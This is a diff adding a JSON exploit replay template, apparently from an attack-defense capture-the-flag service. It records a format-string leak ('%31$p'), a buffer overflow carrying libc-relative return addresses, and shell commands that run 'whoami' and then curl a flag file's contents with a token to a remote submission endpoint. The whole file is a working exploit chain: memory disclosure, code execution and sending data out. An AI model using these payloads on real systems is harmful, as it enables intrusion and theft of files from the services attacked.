@@ -1,0 +1,8 @@
+[
+    "1Who r u?\\n", 
+    "0%31$p\\n", 
+    "1welcome!0x{{{LIBC_BASE:133168:12:HEX:10:0x7fee5c037830}}}", 
+    "0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00{{{LIBC_BASE:135426:8:ORI:72:0x7fee5c038102}}}{{{LIBC_BASE:1625431:8:ORI:80:0x7fee5c1a3d57}}}{{{LIBC_BASE:283536:8:ORI:88:0x7fee5c05c390}}}\\n", 
+    "1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x01HTTP/1.1 404 Not Found\\r\\nContent-Type: tex{{{HEAP_BASE:85876:3:ORI:106:0x682f74}}}tml;{{{HEAP_BASE:99104:3:ORI:113:0x686320}}}arset=UTF-8\\r\\nContent-L{{{HEAP_BASE:36453:3:ORI:138:0x676e65}}}th: 23\\r\\nServer: EasyServer (Linux)\\r\\n\\r{{{HEAP_BASE:89098:3:ORI:178:0x683c0a}}}3>{{{HEAP_BASE:33104:3:ORI:183:0x676150}}}e Not Found{{{HEAP_BASE:85820:3:ORI:197:0x682f3c}}}3>", 
+    "0whoami{{{HEAP_BASE:104202:3:ORI:6:0x68770a}}}oami\\ncur{{{HEAP_BASE:82028:3:ORI:17:0x68206c}}}ttp://10.0.0.2/api/f{{{HEAP_BASE:33132:3:ORI:86:0x67616c}}}/submit --data \"f{{{HEAP_BASE:33132:3:ORI:86:0x67616c}}}=`cat /f{{{HEAP_BASE:33132:3:ORI:86:0x67616c}}}s/fake{{{HEAP_BASE:33581:3:ORI:80:0x67632d}}}i/f{{{HEAP_BASE:33132:3:ORI:86:0x67616c}}}`&token=aXVY498k\"\\n"
+]
